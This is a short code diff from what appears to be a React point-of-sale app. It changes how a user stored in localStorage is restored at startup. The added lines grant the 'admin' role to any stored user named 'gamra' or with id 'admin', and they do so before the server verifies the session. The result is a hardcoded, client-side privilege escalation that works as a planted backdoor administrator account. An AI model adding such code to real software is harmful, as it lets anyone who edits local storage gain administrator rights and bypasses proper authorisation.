@@ -361,6 +361,10 @@ export default function App() {
         if (stored && stored !== 'undefined') {
           const u = JSON.parse(stored);
           if (u && u.id) {
+            if (u.username?.toLowerCase() === 'gamra' || u.id === 'admin') {
+              u.role = 'admin';
+              localStorage.setItem('pos_user', JSON.stringify(u));
+            }
             try {
               const verification = await api.verifySession(u.id, u.sessionVersion || u.session_version);
               if (verification && verification.status === 'invalid') {
